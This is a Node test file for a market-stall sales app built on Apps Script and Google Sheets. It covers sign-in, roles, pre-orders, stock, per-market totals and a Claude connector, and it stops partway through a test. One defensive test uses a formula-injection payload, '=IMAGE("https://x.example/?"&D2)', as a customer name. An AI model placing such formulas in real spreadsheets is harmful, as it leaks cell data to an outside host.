/**
 * Runs the real server/*.gs files in Node against an in-memory spreadsheet,
 * with Google's services replaced by small fakes. No network, no Google.
 *
 *   node tests/server.test.js
 *
 * Covers sign-in and permissions, the part where a mistake locks people out
 * or lets the wrong person in.
 */
'use strict';
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const crypto = require('crypto');
const assert = require('assert');

/* ---------- fakes for the Apps Script services ---------- */

function makeSheet() {
  const rows = [];
  const sheet = {
    rows,
    appendRow(r) { rows.push(r.slice()); },
    getLastRow() { return rows.length; },
    getLastColumn() { return rows.reduce((m, r) => Math.max(m, r.length), 0); },
    getRange(r, c, nr, nc) {
      nr = nr || 1; nc = nc || 1;
      return {
        getValues() {
          const out = [];
          for (let i = 0; i < nr; i++) {
            const row = rows[r - 1 + i] || [];
            const o = [];
            for (let j = 0; j < nc; j++) {
              const v = row[c - 1 + j] === undefined ? '' : row[c - 1 + j];
              // Like Sheets: a leading apostrophe only marks text; reading gives the text without it.
              o.push(typeof v === 'string' && v.charAt(0) === "'" ? v.slice(1) : v);
            }
            out.push(o);
          }
          return out;
        },
        getValue() { return this.getValues()[0][0]; },
        setValue(v) { (rows[r - 1] = rows[r - 1] || [])[c - 1] = v; return this; },
        setValues(vs) {
          vs.forEach((row, i) => row.forEach((v, j) => {
            (rows[r - 1 + i] = rows[r - 1 + i] || [])[c - 1 + j] = v;
          }));
          return this;
        },
        setFontWeight() { return this; }, setBackground() { return this; },
        setFontColor() { return this; }
      };
    },
    deleteRow(n) { rows.splice(n - 1, 1); },
    deleteRows(n, k) { rows.splice(n - 1, k); },
    setFrozenRows() {}
  };
  return sheet;
}

function load(googleTokens) {
  const sheets = {};
  const props = {};
  const ctx = {
    console, __gh: [],
    __created: [],
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getName: () => 'Test sheet',
        getSheetByName: (n) => sheets[n] || null,
        insertSheet: (n) => (sheets[n] = Object.assign(makeSheet(), { getName: () => n })),
        getSheets: () => Object.keys(sheets).map((n) => sheets[n])
      }),
      // A new spreadsheet (the backup): kept on ctx.__created to look at.
      create: (name) => {
        const tabs = { Sheet1: Object.assign(makeSheet(), { getName: () => 'Sheet1' }) };
        const ss = { name, tabs, getUrl: () => 'https://docs.google.com/spreadsheets/d/backup' + ctx.__created.length,
          getSheets: () => Object.keys(tabs).map((n) => tabs[n]),
          insertSheet: (n) => (tabs[n] = Object.assign(makeSheet(), { getName: () => n })),
          deleteSheet: (t) => { delete tabs[t.getName()]; } };
        ctx.__created.push(ss);
        return ss;
      },
      getUi: () => ({ alert() {} 
      })
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k) => (k in props ? props[k] : null),
        setProperty: (k, v) => { props[k] = v; }
      })
    },
    Utilities: {
      getUuid: () => crypto.randomUUID(),
      computeHmacSha256Signature: (v, key) =>
        Array.from(crypto.createHmac('sha256', key).update(v).digest()).map((b) => (b > 127 ? b - 256 : b)),
      formatDate: (d, tz, f) => {
        // Like Apps Script in South Africa (UTC+2), for the patterns the server uses.
        const z = new Date(new Date(d).getTime() + 2 * 3600e3), p = (n) => String(n).padStart(2, '0');
        const M = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
        const parts = { yyyy: z.getUTCFullYear(), MMM: M[z.getUTCMonth()], MM: p(z.getUTCMonth() + 1),
          dd: p(z.getUTCDate()), d: z.getUTCDate(), HH: p(z.getUTCHours()), mm: p(z.getUTCMinutes()) };
        return f.replace(/yyyy|MMM|MM|dd|d|HH|mm/g, (k) => parts[k]);
      }
    },
    LockService: { getScriptLock: () => ({ waitLock() { if (ctx.__busy) throw new Error('could not get the lock'); }, releaseLock() {} }) },
    UrlFetchApp: {
      fetch: (url, opts) => {
        if (url.indexOf('api.github.com') !== -1 && opts && opts.method === 'get') {
          const good = /good/.test(opts.headers.Authorization);
          return { getResponseCode: () => (good ? 200 : 401), getContentText: () => '{}' };
        }
        if (url.indexOf('api.github.com') !== -1) {
          ctx.__gh.push({ url, opts });
          return { getResponseCode: () => 201,
                   getContentText: () => JSON.stringify({ html_url: 'https://github.com/o/r/issues/7' }) };
        }
        const tok = decodeURIComponent(url.split('id_token=')[1]);
        const info = googleTokens[tok];
        return {
          getResponseCode: () => (info ? 200 : 400),
          getContentText: () => JSON.stringify(info || { error: 'invalid_token' })
        };
      }
    },
    ScriptApp: { getService: () => ({ getUrl: () => 'https://example/exec' }) },
    ContentService: {}, HtmlService: {}
  };
  vm.createContext(ctx);
  // Start every test from "Google off", whatever Platform.gs currently holds.
  const dir = path.join(__dirname, '..', 'server');
  fs.readdirSync(dir).filter((f) => f.endsWith('.gs')).sort().forEach((f) => {
    vm.runInContext(fs.readFileSync(path.join(dir, f), 'utf8'), ctx, { filename: f });
  });
  ctx.SF.PLATFORM.googleClientId = '';
  ctx.SF.PLATFORM.admins = [];
  ctx.SF.migrate();
  return { SF: ctx.SF, sheets, props, gh: ctx.__gh, ctx, created: ctx.__created };
}

const CLIENT = 'client-123.apps.googleusercontent.com';
const future = String(Math.floor(Date.now() / 1000) + 3600);
function idToken(email, extra) {
  return Object.assign({ aud: CLIENT, iss: 'https://accounts.google.com',
                         email, email_verified: 'true', exp: future, name: 'Test' }, extra || {});
}
const TOKENS = {
  admin: idToken('Boss@StallFlow.co.za'),
  helper: idToken('helper@gmail.com'),
  stranger: idToken('stranger@gmail.com'),
  wrongAud: idToken('helper@gmail.com', { aud: 'someone-else' }),
  unverified: idToken('helper@gmail.com', { email_verified: 'false' })
};

let failures = 0;
function test(name, fn) {
  try { fn(); console.log('ok   ' + name); }
  catch (e) { failures++; console.log('FAIL ' + name + '\n     ' + e.message); }
}
const signIn = (SF, credential) => SF.dispatch('signInGoogle', { credential, device: 'd1' }).data;

/* ---------- PIN mode, before Google is switched on ---------- */

test('without a client ID, PIN sign-in still works', () => {
  const { SF } = load(TOKENS);
  assert.strictEqual(SF.googleOn(), false);
  SF.setPin('owner', '4321');
  const r = SF.dispatch('signIn', { pin: '4321', device: 'd1' }).data;
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.role, 'owner');
  assert.strictEqual(SF.dispatch('health', { token: r.token }).ok, true);
});

test('without a client ID, Google sign-in is refused', () => {
  const { SF } = load(TOKENS);
  assert.strictEqual(signIn(SF, 'admin').ok, false);
});

test('a client ID with no admins leaves PINs on, so nobody is locked out', () => {
  const { SF } = load(TOKENS);
  SF.PLATFORM.googleClientId = CLIENT;
  SF.PLATFORM.admins = [];
  assert.strictEqual(SF.googleOn(), false);
  SF.setPin('owner', '4321');
  assert.strictEqual(SF.dispatch('signIn', { pin: '4321', device: 'd1' }).data.ok, true);
});

/* ---------- Google mode ---------- */

function google() {
  const env = load(TOKENS);
  env.SF.PLATFORM.googleClientId = CLIENT;
  env.SF.PLATFORM.admins = ['boss@stallflow.co.za'];
  return env;
}

test('a platform admin signs in as owner, whatever the case of the email', () => {
  const { SF } = google();
  const r = signIn(SF, 'admin');
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.role, 'owner');
  assert.strictEqual(r.user, 'boss@stallflow.co.za');
});

test('someone not on the list is turned away with a clear message', () => {
  const { SF } = google();
  const r = signIn(SF, 'stranger');
  assert.strictEqual(r.ok, false);
  assert.ok(/not been added/.test(r.message));
});

test('a token for another app, or an unverified email, is refused', () => {
  const { SF } = google();
  SF.append('users', { Email: 'helper@gmail.com', Role: 'cashier', Active: 'Yes' });
  assert.strictEqual(signIn(SF, 'wrongAud').ok, false);
  assert.strictEqual(signIn(SF, 'unverified').ok, false);
  assert.strictEqual(signIn(SF, 'nonsense').ok, false);
});

test('PINs stop working once Google is on', () => {
  const { SF } = load(TOKENS);
  SF.setPin('owner', '4321');
  const pinToken = SF.dispatch('signIn', { pin: '4321', device: 'd1' }).data.token;
  SF.PLATFORM.googleClientId = CLIENT;
  SF.PLATFORM.admins = ['boss@stallflow.co.za'];
  assert.strictEqual(SF.dispatch('signIn', { pin: '4321', device: 'd1' }).data.ok, false);
  assert.strictEqual(SF.dispatch('signIn', { pin: '', device: 'd1' }).data.ok, false,
    'a blank PIN must not give owner access any more');
  assert.strictEqual(SF.dispatch('health', { token: pinToken }).code, 'auth');
});

test('the owner adds a cashier, who can sell but not see People', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  const add = SF.dispatch('savePerson', { token: owner, opId: 'a1', email: 'Helper@Gmail.com',
                                           role: 'cashier' });
  assert.strictEqual(add.ok, true);
  const helper = signIn(SF, 'helper');
  assert.strictEqual(helper.ok, true);
  assert.strictEqual(helper.role, 'cashier');
  assert.strictEqual(SF.dispatch('till', { token: helper.token }).ok, true);
  assert.strictEqual(SF.dispatch('people', { token: helper.token }).code, 'forbidden');
});

test('promoting someone works on their next tap, without signing in again', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  SF.dispatch('savePerson', { token: owner, opId: 'a1', email: 'helper@gmail.com', role: 'cashier' });
  const helper = signIn(SF, 'helper').token;
  assert.strictEqual(SF.dispatch('people', { token: helper }).code, 'forbidden');
  SF.dispatch('savePerson', { token: owner, opId: 'a2', email: 'helper@gmail.com', role: 'owner' });
  assert.strictEqual(SF.dispatch('people', { token: helper }).ok, true);
});

test('switching someone off locks them out straight away', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  SF.dispatch('savePerson', { token: owner, opId: 'a1', email: 'helper@gmail.com', role: 'manager' });
  const helper = signIn(SF, 'helper').token;
  SF.dispatch('savePerson', { token: owner, opId: 'a2', email: 'helper@gmail.com', role: 'manager',
                              active: false });
  assert.strictEqual(SF.dispatch('till', { token: helper }).code, 'auth');
  assert.strictEqual(signIn(SF, 'helper').ok, false);
});

test('a platform admin cannot be demoted, and nobody can change their own access', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  assert.strictEqual(SF.dispatch('savePerson', { token: owner, opId: 'a1',
    email: 'boss@stallflow.co.za', role: 'viewer' }).ok, false);
  SF.dispatch('savePerson', { token: owner, opId: 'a2', email: 'helper@gmail.com', role: 'owner' });
  const helper = signIn(SF, 'helper').token;
  assert.strictEqual(SF.dispatch('savePerson', { token: helper, opId: 'a3',
    email: 'helper@gmail.com', role: 'viewer' }).ok, false);
});

test('a forged or edited token is refused', () => {
  const { SF } = google();
  const t = signIn(SF, 'admin').token.split('|');
  t[3] = 'helper@gmail.com';
  assert.strictEqual(SF.dispatch('health', { token: t.join('|') }).code, 'auth');
});

test('the audit trail names the person, not just the role', () => {
  const { SF, sheets } = google();
  const owner = signIn(SF, 'admin').token;
  SF.dispatch('savePerson', { token: owner, opId: 'a1', email: 'helper@gmail.com', role: 'cashier' });
  const actors = sheets.Audit.rows.slice(1).map((r) => r[1]);
  assert.ok(actors.indexOf('boss@stallflow.co.za') !== -1, actors.join(', '));
});

test('boot tells the app who is signed in and that Google is on', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  const b = SF.dispatch('boot', { token: owner }).data;
  assert.strictEqual(b.me.user, 'boss@stallflow.co.za');
  assert.strictEqual(b.auth.google, true);
});

/* ---------- orders from the public page ---------- */

function shop(marketDate) {
  const env = load(TOKENS);
  const SF = env.SF;
  SF.append('products', { ProductId: 'P01', Name: 'Apricot Jam', Type: 'stocked', Unit: 'each',
                          Price: 70, Active: 'Yes', Sort: 10 });
  SF.move('P01', 10, 'adjust', 'test');
  SF.append('markets', { MarketId: 'M01', Name: 'Test Market', Date: marketDate, Status: 'planned' });
  SF.set('activeMarket', 'M01');
  return env;
}
const day = (n) => new Date(Date.now() + n * 864e5).toISOString().slice(0, 10);
let op = 0;
const order = (SF, extra) => SF.dispatch('placeOrder', Object.assign({
  opId: 'o' + (op++), name: 'Anna', phone: '082 123 4567', consent: true,
  lines: [{ id: 'P01', qty: 1 }] }, extra || {}));

test('a formula typed as a name is stored as plain text', () => {
  const { SF, sheets } = shop(day(3));
  assert.strictEqual(order(SF, { name: '=IMAGE("https://x.example/?"&D2)', note: '+1 more' }).ok, true);
  const row = sheets.Orders.rows[1];
  assert.ok(String(row[4]).startsWith("'="), 'name: ' + row[4]);
  assert.ok(String(row[13]).startsWith("'+"), 'note: ' + row[13]);
});

test('one phone number can hold at most 2 unpaid orders per market', () => {
  const { SF } = shop(day(3));
  assert.strictEqual(order(SF).ok, true);
  assert.strictEqual(order(SF, { phone: '0821234567' }).ok, true);
  const third = order(SF, { phone: '+27 82 123 4567'.replace('+27 ', '0') });
  assert.strictEqual(third.ok, false);
  assert.ok(/already has 2/.test(third.message));
  assert.strictEqual(order(SF, { phone: '083 999 0000' }).ok, true, 'someone else can still order');
});

test('pre-orders close by themselves once the market date has passed', () => {
  const { SF } = shop(day(-1));
  assert.strictEqual(SF.preordersOpen(), false);
  assert.strictEqual(order(SF).ok, false);
  assert.strictEqual(SF.dispatch('catalogue', {}).data.open, false);
});

test('pre-orders stay open on the day of the market', () => {
  const { SF } = shop(day(0));
  assert.strictEqual(order(SF).ok, true);
});

test('releasing unpaid reservations puts the stock back', () => {
  const { SF } = shop(day(3));
  order(SF); order(SF, { phone: '083 999 0000' });
  assert.strictEqual(SF.onHand().P01, 8);
  SF.setPin('owner', '4321');
  const t = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  const r = SF.dispatch('releaseUnpaid', { token: t, opId: 'r1' });
  assert.strictEqual(r.released, 2);
  assert.strictEqual(SF.onHand().P01, 10);
});

test('customer details are wiped once their market is over, and only then', () => {
  const { SF, sheets } = shop(day(3));
  order(SF, { note: 'gate 2' });
  SF.purgeCustomers();
  assert.strictEqual(String(sheets.Orders.rows[1][4]), 'Anna', 'live market keeps its customers');
  SF.append('markets', { MarketId: 'M02', Name: 'Next', Date: day(10), Status: 'planned' });
  SF.set('activeMarket', 'M02');
  assert.strictEqual(SF.purgeCustomers(), 0, 'a future market is not over yet');
  SF.setCell('markets', 2, 'Date', day(-1));
  assert.strictEqual(SF.purgeCustomers(), 1);
  const row = sheets.Orders.rows[1];
  assert.deepStrictEqual([row[4], row[5], row[13]], ['Customer', '', '']);
  assert.strictEqual(row[8], 70, 'the money stays');
});

test('the Duxies stocktake loads prices and counts, and running it twice changes nothing', () => {
  const { SF } = shop(day(3));
  const ctx = vm.createContext(Object.assign({}, { SF, SpreadsheetApp: {} }));
  // Stocktake.gs only needs SF, so run it in a small context that shares it.
  ['Costing.gs', 'Stocktake.gs'].forEach((f) => vm.runInContext(
    fs.readFileSync(path.join(__dirname, '..', 'stalls', 'duxies', f), 'utf8'), ctx));
  SF.pots = () => ctx.sfPots();
  SF.newPot = (n) => ctx.sfNewPot(n);   // in Apps Script every file shares one global scope
  const first = ctx.sfApplyStocktake();
  assert.strictEqual(first.off, 1, 'the old placeholder jam is switched off');
  assert.strictEqual(SF.onHand().P01, 0, 'and its jars no longer count');
  const ps = SF.products();
  const find = (n, v) => ps.find((p) => p.name === n && p.variant === v);
  assert.strictEqual(find('Strawberry', '125 ml').onHand, 17);
  assert.strictEqual(find('Strawberry', '352 ml').price, 70);
  assert.strictEqual(find('Fig', '125 ml').price, 50);
  assert.strictEqual(find('Orange Marmalade Whiskey', '250 ml').price, 60);
  assert.strictEqual(find('Butter Biscuits', '300 g pack').type, 'made');
  assert.strictEqual(first.jars, 225);
  const big = find('Strawberry', '352 ml').cost, small = find('Strawberry', '125 ml').cost;
  assert.ok(big > 30 && big < 40, 'a big strawberry jar costs about R34, got ' + big);
  assert.ok(small > 7.8 && small < big, 'a small jar costs its bottle and less fruit');
  assert.ok(find('Butter Biscuits', '300 g pack').cost > 20);
  assert.strictEqual(find('Crunchies', '300 g pack').cost, 0, 'no recipe, no guess');
  assert.strictEqual(find('Strawberry', '352 ml').onHand, 14, 'a bottle cost adds no stock');
  const again = ctx.sfApplyStocktake();
  assert.deepStrictEqual([again.added, again.moved], [0, 0]);
  assert.strictEqual(find('Strawberry', '352 ml').cost, SF.products().find((p) => p.name === 'Strawberry' && p.variant === '352 ml').cost);
  assert.strictEqual(SF.rows('batches').length, again.costed, 'running it again updates, never duplicates');

  // Cooking a pot: pre-filled recipe, jars on the shelf, cupboard goes down.
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  SF.dispatch('savePantry', { token: tok, opId: 'c1', item: 'Strawberries', qty: 5, unit: 'kg' });
  SF.dispatch('savePantry', { token: tok, opId: 'c2', item: 'Sugar', qty: 2000, unit: 'g' });
  SF.dispatch('savePantry', { token: tok, opId: 'c3', item: '352 ml bottles', qty: 10, unit: 'each' });
  const st = SF.dispatch('stock', { token: tok }).data;
  const pot = st.pots.find((x) => x.name === 'Strawberry');
  assert.strictEqual(st.pantry.some((r) => r.item === 'Odd bottles'), true, 'the cupboard lists what pots use');
  const bigId = pot.sizes.find((x) => x.variant === '352 ml').productId;
  const smallId = pot.sizes.find((x) => x.variant === '125 ml').productId;
  const before = SF.onHand()[bigId];
  const res = SF.dispatch('cookPot', { token: tok, opId: 'c4', name: 'Strawberry', lines: pot.lines,
                                       jars: { [bigId]: 5, [smallId]: 3 } });
  assert.strictEqual(res.ok, true, res.message);
  assert.strictEqual(SF.onHand()[bigId], before + 5);
  const left = Object.fromEntries(SF.pantry().map((r) => [r.item, r.qty]));
  assert.deepStrictEqual([left.Strawberries, left.Sugar, left['352 ml bottles']], [2, 0, 5]);
  // Changing the usual recipe, and starting a new jam.
  const lines2 = pot.lines.concat([{ label: 'Lemon juice', qty: 1, unit: 'pot', price: 5 }]);
  assert.strictEqual(SF.dispatch('saveRecipe', { token: tok, opId: 'r1', name: 'Strawberry',
                                                 makes: 6, lines: lines2 }).ok, true);
  const pot2 = SF.dispatch('stock', { token: tok }).data.pots.find((x) => x.name === 'Strawberry');
  assert.ok(pot2.lines.some((l) => l.label === 'Lemon juice'), 'the saved recipe is used');
  const nu = SF.dispatch('saveRecipe', { token: tok, opId: 'r2', name: 'Quince', makes: 6,
                                         lines: [{ label: 'Quinces', qty: 3, unit: 'kg', price: 20 }] });
  assert.strictEqual(nu.isNew, true);
  const q = SF.dispatch('stock', { token: tok }).data.pots.find((x) => x.name === 'Quince');
  assert.strictEqual(q.sizes.length, 3, 'a new jam gets all three sizes on the shelf list');
  assert.strictEqual(JSON.stringify(q.sizes.map((x) => x.variant)), JSON.stringify(['352 ml', '250 ml', '125 ml']));
  assert.strictEqual(SF.dispatch('cookPot', { token: tok, opId: 'c5', name: 'Strawberry',
                                              lines: pot.lines, jars: {} }).ok, false);
});

test('a sale between markets is kept apart from the live market', () => {
  const { SF } = shop(day(3));
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  SF.dispatch('sell', { token: tok, opId: 's1', lines: [{ id: 'P01', qty: 1 }] });
  SF.dispatch('sell', { token: tok, opId: 's2', where: 'home', lines: [{ id: 'P01', qty: 2 }] });
  const at = SF.dispatch('dashboard', { token: tok, marketId: 'M01' }).data;
  const home = SF.dispatch('dashboard', { token: tok, marketId: 'HOME' }).data;
  assert.ok(at.markets.some((m) => m.id === 'HOME'), 'Numbers can pick it');
  assert.strictEqual(SF.onHand().P01, 7, 'both sales come off the shelf');
  const total = (d) => JSON.stringify(d).match(/"revenue":(\d+)/)[1];
  assert.strictEqual(total(at), '70');
  assert.strictEqual(total(home), '140');
});

test('two markets on the same day keep their own sales', () => {
  const { SF } = shop(day(3));
  SF.append('markets', { MarketId: 'M02', Name: 'RNW', Date: day(3), Status: 'planned' });
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  SF.dispatch('sell', { token: tok, opId: 'a', marketId: 'M01', lines: [{ id: 'P01', qty: 1 }] });
  SF.dispatch('sell', { token: tok, opId: 'b', marketId: 'M02', lines: [{ id: 'P01', qty: 2 }] });
  SF.dispatch('sell', { token: tok, opId: 'c', marketId: 'nonsense', lines: [{ id: 'P01', qty: 1 }] });
  const t1 = SF.dispatch('till', { token: tok, marketId: 'M01' }).data;
  const t2 = SF.dispatch('till', { token: tok, marketId: 'M02' }).data;
  assert.strictEqual(t1.totals.tillTotal, 140, 'an unknown market falls back to the live one');
  assert.strictEqual(t2.totals.tillTotal, 140);
  assert.ok(t1.markets.some((m) => m.id === 'M02') && t1.markets.some((m) => m.id === 'HOME'));
});

test('markets running at the same time stay apart: sales, pre-orders and numbers', () => {
  const { SF } = shop(day(0));
  SF.append('markets', { MarketId: 'M02', Name: 'RNW', Date: day(0), Status: 'planned' });
  SF.set('preorders', 'yes');
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  const o1 = SF.dispatch('placeOrder', { opId: 'o1', name: 'Anna', phone: '082 000 0001', consent: true,
    lines: [{ id: 'P01', qty: 1 }], market: 'M01' });
  const o2 = SF.dispatch('placeOrder', { opId: 'o2', name: 'Bea', phone: '082 000 0002', consent: true,
    lines: [{ id: 'P01', qty: 1 }], market: 'M02' });
  assert.ok(o1.ok && o2.ok, JSON.stringify([o1, o2]));
  SF.dispatch('sell', { token: tok, opId: 's1', marketId: 'M01', lines: [{ id: 'P01', qty: 1 }] });
  SF.dispatch('sell', { token: tok, opId: 's2', marketId: 'M02', lines: [{ id: 'P01', qty: 3 }] });
  SF.dispatch('sell', { token: tok, opId: 's3', marketId: 'home', lines: [{ id: 'P01', qty: 1 }] });
  const t1 = SF.dispatch('till', { token: tok, marketId: 'M01' }).data;
  const t2 = SF.dispatch('till', { token: tok, marketId: 'M02' }).data;
  const th = SF.dispatch('till', { token: tok, marketId: 'home' }).data;
  assert.strictEqual(t1.totals.tillCount, 1); assert.strictEqual(t2.totals.tillCount, 1);
  assert.strictEqual(t2.totals.tillTotal, 3 * t1.totals.tillTotal, 'each market has only its own sales');
  assert.strictEqual(th.totals.tillCount, 1);
  assert.strictEqual(t1.unpaid.map((o) => o.customer).join(), 'Anna');
  assert.strictEqual(t2.unpaid.map((o) => o.customer).join(), 'Bea');
  assert.strictEqual(th.unpaid.length, 0);
  assert.strictEqual(t1.running.map((m) => m.id + ':' + m.count).sort().join(), 'M01:1,M02:1', 'every market on today\'s date is listed with its own count');
  const n1 = SF.dispatch('dashboard', { token: tok, marketId: 'M01' }).data;
  const n2 = SF.dispatch('dashboard', { token: tok, marketId: 'M02' }).data;
  assert.strictEqual(n2.summary.revenue, 3 * n1.summary.revenue, 'Numbers are per market too');
});

test('a stall data fix runs once, only changes what is still as it was, and never breaks the app', () => {
  const env = shop(day(3));
  const { SF, ctx } = env;
  SF.append('markets', { MarketId: 'M03', Name: 'Blairegowrie Church Market', Date: day(0), Location: 'Christ Church Blairgowrie, Gordon Avenue', Status: 'planned' });
  vm.runInContext(fs.readFileSync(path.join(__dirname, '..', 'stalls', 'duxies', 'Fixes.gs'), 'utf8'), ctx);
  const row = () => SF.rows('markets').filter((m) => m.MarketId === 'M03')[0];
  assert.strictEqual(SF.runDataFixes().length, 3, 'both one-off fixes ran, and the gift boxes that need no named jar');
  assert.strictEqual(row().Name, 'Blairegowrie Craft Market');
  assert.ok(/Domus Dei Campus, 39 Malcolm Road/.test(row().Location), row().Location);
  // typed in by hand afterwards: the fix is spent and never overwrites it
  SF.setCell('markets', row()._row, 'Name', 'Blairgowrie Craft Market');
  assert.strictEqual(SF.runDataFixes().length, 0);
  assert.strictEqual(row().Name, 'Blairgowrie Craft Market');
  // the lizard ornament: added once with 1 in stock, and not again
  const liz = () => SF.products({ all: true }).filter((x) => /lizard/i.test(x.name));
  assert.strictEqual(liz().length, 1); assert.strictEqual(liz()[0].onHand, 1);
  assert.strictEqual(liz()[0].price, 105); assert.strictEqual(liz()[0].category, 'Resin');
  // a fix that throws does not escape
  vm.runInContext("sfDataFixes = function () { return [{ id: 'boom', what: 'x', run: function () { throw new Error('no'); } }]; };", ctx);
  assert.deepStrictEqual(Array.from(SF.runDataFixes()), []);
});

test('a new product can start with the stock she has on the shelf', () => {
  const { SF } = shop(day(3));
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  const r = SF.dispatch('saveProduct', { token: tok, opId: 'np1', name: 'Lizard resin ornament', category: 'Resin', type: 'stocked', unit: 'each', price: 105, qty: 4 });
  assert.ok(r.ok, JSON.stringify(r));
  let p = SF.dispatch('stock', { token: tok }).data.products.filter((x) => x.name === 'Lizard resin ornament')[0];
  assert.strictEqual(p.onHand, 4); assert.strictEqual(p.price, 105);
  const r2 = SF.dispatch('saveProduct', { token: tok, opId: 'np2', name: 'Pot of cakes', category: 'Baking', type: 'made', unit: 'each', price: 20, qty: 9, capacity: 10 });
  assert.ok(r2.ok);
  p = SF.dispatch('stock', { token: tok }).data.products.filter((x) => x.name === 'Pot of cakes')[0];
  assert.ok(!p.onHand, 'made-to-order items have no stock count');
  const again = SF.dispatch('saveProduct', { token: tok, opId: 'np1', name: 'Lizard resin ornament', category: 'Resin', type: 'stocked', unit: 'each', price: 105, qty: 4 });
  p = SF.dispatch('stock', { token: tok }).data.products.filter((x) => x.name === 'Lizard resin ornament');
  assert.strictEqual(p.length, 1); assert.strictEqual(p[0].onHand, 4, 'the same request sent twice adds once');
});

/* ---------- Claude as a connector ---------- */
function claudeKit() {
  const env = shop(day(3));
  const { SF } = env;
  // Google mode: the connector belongs to the StallFlow administrator, not to the stall's own owner.
  SF.PLATFORM.googleClientId = CLIENT; SF.PLATFORM.admins = ['boss@stallflow.co.za'];
  env.owner = signIn(SF, 'admin').token;                                   // the platform admin
  SF.dispatch('savePerson', { token: env.owner, opId: 'ku1', email: 'helper@gmail.com', role: 'owner' });
  SF.dispatch('savePerson', { token: env.owner, opId: 'ku2', email: 'stranger@gmail.com', role: 'manager' });
  env.stallOwner = signIn(SF, 'helper').token;                             // the stall's own owner
  env.manager = signIn(SF, 'stranger').token;
  env.key = SF.dispatch('assistantKey', { token: env.owner, opId: 'k' + Math.random() }).key;
  env.rpc = (method, params, key, id) => {
    const r = SF.mcp(key === undefined ? env.key : key, { jsonrpc: '2.0', id: id === undefined ? 1 : id, method, params });
    return r;
  };
  env.call = (name, args) => {
    const r = env.rpc('tools/call', { name, arguments: args }).reply;
    return { isError: r.result.isError, data: JSON.parse(r.result.content[0].text) };
  };
  return env;
}

test('only the StallFlow administrator can make, see or end the connector key, and only its hash is kept', () => {
  const { SF, owner, stallOwner, manager, props, key } = claudeKit();
  assert.ok(key && key.length >= 32);
  [manager, stallOwner].forEach((t, i) => {
    assert.strictEqual(SF.dispatch('assistantKey', { token: t, opId: 'm1' + i }).code, 'forbidden', 'cannot make one');
    assert.strictEqual(SF.dispatch('assistantOff', { token: t, opId: 'm2' + i }).code, 'forbidden', 'cannot switch it off');
    const st = SF.dispatch('assistantStatus', { token: t });
    assert.strictEqual(st.code || (st.data && st.data.code), 'forbidden', 'cannot even see if it is on');
  });
  assert.strictEqual(SF.dispatch('assistantStatus', { token: owner }).data.on, true, 'still on: nobody else touched it');
  assert.ok(!JSON.stringify(props).includes(key) && !JSON.stringify(SF.rows('settings')).includes(key), 'the key itself is not stored');
  assert.strictEqual(SF.dispatch('boot', { token: stallOwner }).data.me.admin, false, 'the app is told not to show it');
  assert.strictEqual(SF.dispatch('boot', { token: owner }).data.me.admin, true);
});

test('in PIN mode nobody is the administrator, so the connector cannot be set up', () => {
  const { SF } = shop(day(3));
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  assert.strictEqual(SF.dispatch('assistantKey', { token: tok, opId: 'p1' }).code, 'forbidden');
});

test('the connector: wrong key, then the protocol, then a fixed list of tools', () => {
  const env = claudeKit();
  assert.strictEqual(env.rpc('tools/list', {}, 'nope').error.code, -32001);
  const init = env.rpc('initialize', { protocolVersion: '2025-06-18' }).reply.result;
  assert.strictEqual(init.protocolVersion, '2025-06-18'); assert.ok(init.capabilities.tools);
  const tools = env.rpc('tools/list', {}).reply.result.tools.map((t) => t.name).sort();
  assert.strictEqual(tools.join(), 'stallflow_add_product,stallflow_adjust_stock,stallflow_cancel_sale,stallflow_problems,stallflow_record_sale,stallflow_sales,stallflow_set_payment,stallflow_set_price,stallflow_stock,stallflow_stocktake,stallflow_switch_product');
  assert.strictEqual(env.SF.mcp(env.key, { jsonrpc: '2.0', method: 'notifications/initialized' }).reply, null, 'a notification gets no answer');
  assert.strictEqual(env.call('sell', { lines: [] }).data.ok, false, 'no tool outside the list');
  assert.strictEqual(env.call('stallflow_delete_market', {}).data.ok, false);
  assert.strictEqual(env.call('setPin', { role: 'owner', pin: '1' }).data.ok, false);
});

test('the connector adds, prices, restocks and switches off, and records each as Claude', () => {
  const env = claudeKit(), { SF } = env;
  const added = env.call('stallflow_add_product', { name: 'Lizard resin ornament', category: 'Resin', price: 105, qty: 4, request_id: 'r1' });
  assert.ok(added.data.ok, JSON.stringify(added));
  env.call('stallflow_add_product', { name: 'Lizard resin ornament', category: 'Resin', price: 105, qty: 4, request_id: 'r1' });
  const find = () => env.call('stallflow_stock', {}).data.products.filter((p) => p.name === 'Lizard resin ornament');
  assert.strictEqual(find().length, 1, 'the same request id changes things once');
  assert.strictEqual(find()[0].onHand, 4); assert.strictEqual(find()[0].price, 105);
  const id = find()[0].id;
  assert.ok(env.call('stallflow_adjust_stock', { product_id: id, qty: -1, reason: 'damaged' }).data.ok);
  assert.ok(env.call('stallflow_adjust_stock', { product_id: id, qty: 10, reason: 'delivery' }).data.ok);
  assert.strictEqual(find()[0].onHand, 13);
  assert.strictEqual(env.call('stallflow_adjust_stock', { product_id: id, qty: 501 }).data.ok, false, 'a huge change is left to the owner');
  assert.strictEqual(env.call('stallflow_adjust_stock', { product_id: 'P99', qty: 1 }).data.ok, false);
